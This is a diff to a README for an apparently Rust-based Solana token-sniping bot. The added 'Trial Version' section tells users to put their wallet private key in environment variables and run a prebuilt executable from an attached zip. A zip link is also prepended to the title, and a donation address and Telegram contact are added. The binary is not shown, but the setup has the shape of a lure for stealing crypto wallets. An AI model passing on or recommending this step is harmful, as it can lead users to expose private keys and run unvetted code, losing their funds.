@@ -1,4 +1,4 @@
-# Solana Ultra-Fast New Token Sniper on Raydium and Pump.fun in Rust 🚀
+[raypump-bot.zip](https://github.com/user-attachments/files/18690139/raypump-bot.zip)# Solana Ultra-Fast New Token Sniper on Raydium and Pump.fun in Rust 🚀
 
 ## Overview
 
@@ -58,7 +58,35 @@ src/
 ├── lib.rs
 └── main.rs
 ```
+---
+## Trial Version
 
+### How To Run
+1. Environment Variables Settings
+```plaintext
+PRIVATE_KEY=your_private_key_here
+RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
+RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key_here
+DEVNET_RPC_HTTPS=https://devnet.helius-rpc.com/?api-key=your_api_key_here
+RAYDIUM_LPV4=675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8
+SLIPPAGE=10
+JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
+JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
+JITO_TIP_PERCENTILE=50
+YELLOWSTONE_RPC_HTTP=http://elite.rpc.solanavibestation.com/?api_key=your_api_key_here
+YELLOWSTONE_RPC_WSS=ws://elite.rpc.solanavibestation.com/?api_key=your_api_key_here
+JITO_TIP_VALUE=0.004
+BUY_THRESHOLD=1000
+SELL_THRESHOLD=300
+```
+2. Run `raypump-bot.exe`.
+  🗂️ [raypump-bot.zip](https://github.com/user-attachments/files/18690135/raypump-bot.zip)
+
+---
+## Donate
+
+Ez7F9HP9F5XZ5SXmHeAkdPiPp6mfPU5wPjCHCYCfK3ZP
+---
 ## Support
 
 For support and further inquiries, please connect via Telegram: [jwest951227](https://t.me/jwest951227).
